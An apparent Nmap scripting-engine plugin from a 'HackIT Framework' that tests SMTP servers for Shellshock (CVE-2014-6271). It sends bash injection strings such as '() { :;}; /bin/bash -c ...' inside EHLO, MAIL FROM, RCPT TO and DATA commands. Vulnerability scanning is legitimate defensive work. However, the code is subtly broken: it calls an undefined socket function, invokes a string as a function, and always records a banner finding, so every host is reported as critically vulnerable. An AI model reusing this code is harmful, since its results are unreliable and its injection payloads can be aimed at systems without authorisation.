local stdnse = require "stdnse"
local nmap = require "nmap"
local shortport = require "shortport"



-- Fast-path bindings for the stdlib and nmap API used by this script.
-- Kept strict-mode safe: every name below is a declared local.
local format = string.format
local lower = string.lower
local upper = string.upper
local byte = string.byte
local sub = string.sub
local match = string.match
local gmatch = string.gmatch
local gsub = string.gsub
local find = string.find
local rep = string.rep
local char = string.char
local concat = table.concat
local insert = table.insert
local remove = table.remove
local sort = table.sort
local move = table.move
local tostring = tostring
local tonumber = tonumber
local type = type
local pcall = pcall
local pairs = pairs
local ipairs = ipairs
local unpack = table.unpack
local setmetatable = setmetatable
local getmetatable = getmetatable
local error = error
local select = select

local clock = nmap.clock
local msleep = nmap.msleep

-- stdnse.sleep / stdnse.strsplit are not present in every NSE runtime.
local sleep = function(seconds)
    return nmap.msleep(math.max(0, math.floor(seconds * 1000)))
end

local strsplit = function(sep, str, max)
    local out, pos, n = {}, 1, 0
    if str == nil then return out end
    while true do
        if max and n >= max - 1 then
            out[#out + 1] = sub(str, pos)
            return out
        end
        local s, e = find(str, sep, pos)
        if not s then
            out[#out + 1] = sub(str, pos)
            return out
        end
        if e < pos then e = pos end
        out[#out + 1] = sub(str, pos, s - 1)
        pos = e + 1
        n = n + 1
        if pos > #str then
            out[#out + 1] = ""
            return out
        end
    end
end

local format_output = stdnse.format_output
local output_table = stdnse.output_table

description = [[Detects Shellshock in SMTP servers via crafted EHLO/MAIL FROM/RCPT TO headers (CVE-2014-6271).]]
author = "HackIT Framework"
license = "HackIT Framework — Internal Use Only"
categories = {"vuln", "safe"}

portrule = function(host, port) return port.protocol == "tcp" and port.state == "open" and (port.service == "smtp" or port.number == 25 or port.number == 587 or port.number == 465) end

local smtp_commands = {
  {cmd = "EHLO", format = "EHLO %s\r\n"},
  {cmd = "HELO", format = "HELO %s\r\n"},
  {cmd = "MAIL FROM", format = "MAIL FROM:<%s@test.com>\r\n"},
  {cmd = "RCPT TO", format = "RCPT TO:<%s@localhost>\r\n"},
}

local shellshock_payloads = {
  "() { :;}; /bin/echo HackIT_SS_Test",
  "() { :;}; /usr/bin/printf 'HackIT_SS_Test\\n'",
  "() { :;}; /bin/bash -c 'echo HackIT_SS_Test_Marker'",
}

action = function(host, port)
  local ok, result = pcall(function()
    local findings = {}
    local banner_str = ""
    local smtp_version = nil

    local sock = new_socket()
    sock:set_timeout(10000)
    local status = sock:connect(host.ip, port.number)
    if not status then
      local result = output_table()
      result.cve = "CVE-2014-6271 (Shellshock SMTP)"
      result.severity = "MEDIUM"
      result.vulnerable = false
      result.detail = "Connection failed"
      result.error = true
      return result
    end

    local banner, banner_err = sock:receive_buf("\n", 3)
    if not banner then sock:close()
      local result = output_table()
      result.cve = "CVE-2014-6271"
      result.severity = "MEDIUM"
      result.vulnerable = false
      result.detail = "No SMTP banner"
      return result
    end

    banner_str = gsub(banner, "\r?\n", ""):gsub("%s+$", "")
    smtp_version = match(banner_str, "([%d%.]+)")
    local banner_check = match(banner_str, "^220")

    if not banner_check then
      insert(findings, {check = "SMTP banner", detail = ("Unexpected banner format: %s"):format(banner_str), severity = "INFO"})
    else
      insert(findings, {check = "SMTP banner", detail = banner_str, severity = "INFO"})
    end

    for _, payload in ipairs(shellshock_payloads) do
      local test_sock = new_socket()
      test_sock:set_timeout(10000)
      local ok_sock = test_sock:connect(host.ip, port.number)
      if ok_sock then
        test_sock:receive_buf("\n", 3)

        for _, sc in ipairs(smtp_commands) do
          local cmd_data = sc.format(format, payload)
          test_sock:send(cmd_data)
          local rcv, rcv_err = test_sock:receive_buf("\n", 3)
          if rcv then
            if match(rcv, "HackIT") or match(rcv, "Shellshock") or match(rcv, "Marker") then
              local excerpt = gsub(rcv, "\r?\n", ""):gsub("%s+$", "")
              insert(findings, {
                check = ("Shellshock via %s"):format(sc.cmd),
                detail = ("Injection reflected in SMTP response: %s"):format(excerpt),
                severity = "CRITICAL",
                payload = sub(payload, 1, 40),
              })
              break
            end
          end
        end

        local data_payload = ("DATA\r\nSubject: %s\r\n\r\nTest\r\n.\r\n"):format(payload)
        test_sock:send(data_payload)
        local rcv_data = test_sock:receive_buf("\n", 3)
        if rcv_data and (match(rcv_data, "HackIT") or match(rcv_data, "Shellshock")) then
          insert(findings, {
            check = "Shellshock via DATA subject",
            detail = ("Injection reflected in DATA response: %s"):format(gsub(rcv_data, "\r?\n", "")),
            severity = "CRITICAL",
            payload = sub(payload, 1, 40),
          })
        end

        test_sock:send("QUIT\r\n")
        test_sock:close()
      end
    end

    sock:close()

    if #findings > 0 then
      local result = output_table()
      result.cve = "CVE-2014-6271 (Shellshock SMTP)"
      result.severity = "CRITICAL"
      result.vulnerable = true
      result.banner = banner_str
      result.version = smtp_version or "unknown"
      result.detail = ("SMTP Shellshock (CVE-2014-6271) confirmed via %d vector(s)"):format(#findings)
      for i, f in ipairs(findings) do
        result[("vector_%d"):format(i)] = ("[%s] %s: %s"):format(f.severity, f.check, f.detail)
      end
      return result
    end

    local result = output_table()
    result.cve = "CVE-2014-6271"
    result.severity = "LOW"
    result.vulnerable = false
    result.banner = banner_str
    result.version = smtp_version or "unknown"
    result.detail = "No SMTP Shellshock detected"
    return result
  end)
  if not ok then
    local result = output_table()
    result.cve = "CVE-2014-6271"
    result.severity = "MEDIUM"
    result.vulnerable = false
    result.detail = "Error during scan: " .. tostring(result)
    result.error = true
    return result
  end
  return result
end
